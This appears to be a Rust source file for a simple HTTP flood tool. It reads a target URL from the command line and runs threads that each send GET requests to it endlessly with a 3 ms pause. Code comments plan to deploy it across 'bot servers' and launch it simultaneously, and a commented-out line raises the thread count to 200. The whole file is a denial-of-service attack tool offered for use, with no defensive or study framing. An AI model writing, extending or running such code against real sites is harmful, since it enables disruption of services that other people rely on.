extern crate easy_http_request;
extern crate regex;

use easy_http_request::DefaultHttpRequest;
use std::env;
use std::process;
use std::{thread, time};
use regex::Regex;

// XXX: remotely call bot servers and deploy this script and dependencies
// XXX: remotely call bot servers and execute this program simultaneously

fn main() {
    //let handles = (0..200)
    get_url();
    let handles = (0..2)
        .into_iter()
        .map(|x| {
            thread::spawn(move || {
                ping_many_times(x);
            })
        })
        .collect::<Vec<_>>();

    for thread in handles {
        thread.join().unwrap();
    }
}

fn get_url() -> String {
    let args: Vec<String> = env::args().collect();

    if(args.len() < 2) {
        println!("\nURL missing!\n");
        process::exit(0x0100);         
    }

    let url = args[1].to_string();
    let re  = Regex::new(r"^http[s]{0,1}://").unwrap();

    if(!re.is_match(&url)) {
        println!("\nURL invalid! (http(s)://...)\n");
        process::exit(0x0100);         
    }

    return url; 
}

fn ping_many_times(x: i32) {
    let response = DefaultHttpRequest::get_from_url_str(get_url())
                       .unwrap()
                       .send  ()
                       .unwrap();

    print!("[{}] ",  x);
    print!("{} ",    response.status_code);
    println!("{:?}", response.headers);
    thread::sleep(time::Duration::from_millis(3));
    ping_many_times(x);
}
